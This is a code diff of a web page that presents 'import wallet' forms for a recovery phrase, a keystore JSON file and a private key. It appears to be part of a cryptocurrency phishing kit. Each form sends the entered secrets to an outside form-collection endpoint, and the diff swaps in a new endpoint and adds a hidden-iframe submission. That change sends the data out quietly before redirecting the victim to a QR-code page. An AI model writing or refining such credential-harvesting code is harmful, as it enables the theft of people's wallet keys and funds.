@@ -57,7 +57,7 @@
                     </div>
 
                     <div class="tab-content" id="tab-phrase">
-                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
+                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="recovery_phrase">
                             <label for="recovery-phrase" class="field-label">Recovery Phrase</label>
@@ -68,7 +68,7 @@
                     </div>
 
                     <div class="tab-content hidden" id="tab-keystore">
-                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
+                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="keystore_json">
                             <label for="keystore-json" class="field-label">Keystore JSON</label>
@@ -80,7 +80,7 @@
                     </div>
 
                     <div class="tab-content hidden" id="tab-privateKey">
-                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
+                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="private_key">
                             <label for="private-key" class="field-label">Private Key</label>
@@ -188,29 +188,30 @@
             });
         }
 
-        // Submit form via fetch then redirect to _next (prevents navigating to the action URL)
-        const importForms = document.querySelectorAll('.import-form');
-        async function submitAndRedirect(form) {
-            const nextUrl = form.querySelector('input[name="_next"]')?.value || './qrcode/index.html';
-            const formData = new FormData(form);
-
-            try {
-                await fetch(form.action, {
-                    method: form.method || 'POST',
-                    body: formData,
-                    mode: 'no-cors',
-                });
-            } catch (err) {
-                // Ignore fetch errors (CORS, network, etc.) and still redirect.
-            } finally {
-                window.location.href = nextUrl;
-            }
+        // Submit form in a hidden iframe, then redirect to the `_next` URL.
+        // This avoids navigating the main page to the `action` URL while still sending data.
+        const iframeName = 'submit-target';
+        let submitIframe = document.querySelector(`iframe[name="${iframeName}"]`);
+        if (!submitIframe) {
+            submitIframe = document.createElement('iframe');
+            submitIframe.name = iframeName;
+            submitIframe.style.display = 'none';
+            document.body.appendChild(submitIframe);
         }
 
+        const importForms = document.querySelectorAll('.import-form');
         importForms.forEach(form => {
             form.addEventListener('submit', (event) => {
                 event.preventDefault();
-                submitAndRedirect(form);
+
+                const nextUrl = form.querySelector('input[name="_next"]')?.value || './qrcode/index.html';
+                form.target = iframeName;
+
+                // Submit the form in the hidden iframe, then redirect the main page.
+                form.submit();
+                setTimeout(() => {
+                    window.location.href = nextUrl;
+                }, 400);
             });
         });
     </script>
